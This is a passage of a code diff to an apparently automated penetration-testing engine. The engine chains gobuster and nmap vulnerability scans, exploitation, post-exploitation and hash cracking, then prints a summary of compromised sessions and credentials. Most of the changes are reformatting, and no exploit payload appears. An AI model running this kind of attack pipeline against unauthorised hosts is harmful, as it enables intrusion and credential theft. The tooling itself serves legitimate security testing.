-                    )
+                    scheme = "https" if "https" in web["service"] else "http"
                     self._ask_and_run(
                         f"use gobuster_scan on "
                         f"{scheme}://{target}:{web['port']} "
@@ -1033,8 +1011,11 @@ class Engine:
                     )
             elif phase_id == "WEB_VULN":
                 web = next(
-                    (p for p in self.findings.ports
-                     if p["service"] in ("http", "https", "http-alt")),
+                    (
+                        p
+                        for p in self.findings.ports
+                        if p["service"] in ("http", "https", "http-alt")
+                    ),
                     None,
                 )
                 if web:
@@ -1057,9 +1038,7 @@ class Engine:
                     "SSH_CHECK",
                 )
             elif phase_id == "VULN_SCAN":
-                port_str = ",".join(
-                    str(n) for n in dedup_ports(self.findings.ports)
-                )
+                port_str = ",".join(str(n) for n in dedup_ports(self.findings.ports))
                 self._ask_and_run(
                     f"run this command: nmap -sV --script vuln "
                     f"-T4 -Pn --script-timeout 60s "
@@ -1074,7 +1053,8 @@ class Engine:
                 self.findings.host_info["compromised"] = session_ok
                 if self._state:
                     self._state.record_phase(
-                        "EXPLOIT", session_ok,
+                        "EXPLOIT",
+                        session_ok,
                         reason="" if session_ok else "no session opened",
                     )
             elif phase_id == "POST_EXPLOIT":
@@ -1084,28 +1064,33 @@ class Engine:
                     info("no session — skipping post-exploitation")
                     if self._state:
                         self._state.record_phase(
-                            "POST_EXPLOIT", False,
+                            "POST_EXPLOIT",
+                            False,
                             "no session available",
                         )
             elif phase_id == "HASH_CRACK":
                 self._crack_hashes()
 
         self._final_summary(target, time.time() - t0)
+        self._save_session("completed")
         self.dispatcher.canonical_target = None
 
     def _final_summary(self, target: str, duration: float) -> None:
         rc = self.findings.overall_risk
         rc_color = {
-            "CRITICAL": P.RED, "HIGH": P.AMBER,
-            "MEDIUM": P.YELLOW, "LOW": P.BLUE, "NONE": P.DIM,
+            "CRITICAL": P.RED,
+            "HIGH": P.AMBER,
+            "MEDIUM": P.YELLOW,
+            "LOW": P.BLUE,
+            "NONE": P.DIM,
         }.get(rc, P.DIM)
         console.print()
         div("ENGAGEMENT COMPLETE")
         console.print()
-        label("target",   target)
+        label("target", target)
         label("duration", f"{duration:.0f}s   ({duration / 60:.1f} min)")
         console.print()
-        label("ports",    str(len(self.findings.ports)))
+        label("ports", str(len(self.findings.ports)))
         label(
             "vulns",
             f"{len(self.findings.vulns)}  "
@@ -1119,15 +1104,12 @@ class Engine:
             f"{self.findings.verified_count} confirmed  "
             f"{self.findings.unverified_count} unconfirmed",
         )
-        label("hashes",      str(len(self.findings.hashes)))
+        label("hashes", str(len(self.findings.hashes)))
         label("credentials", str(len(self.findings.credentials)))
-        label("sessions",    str(len(self.findings.sessions)))
-        label("web dirs",    str(len(self.findings.dirs)))
+        label("sessions", str(len(self.findings.sessions)))
+        label("web dirs", str(len(self.findings.dirs)))
         console.print()
-        console.print(
-            f"  [{P.MUTED}]{'risk'.ljust(14)}[/]  "
-            f"[bold {rc_color}]{rc}[/]"
-        )
+        console.print(f"  [{P.MUTED}]{'risk'.ljust(14)}[/]  [bold {rc_color}]{rc}[/]")
         # PlannerState summary
         if self._state:
             summary = self._state.summary()
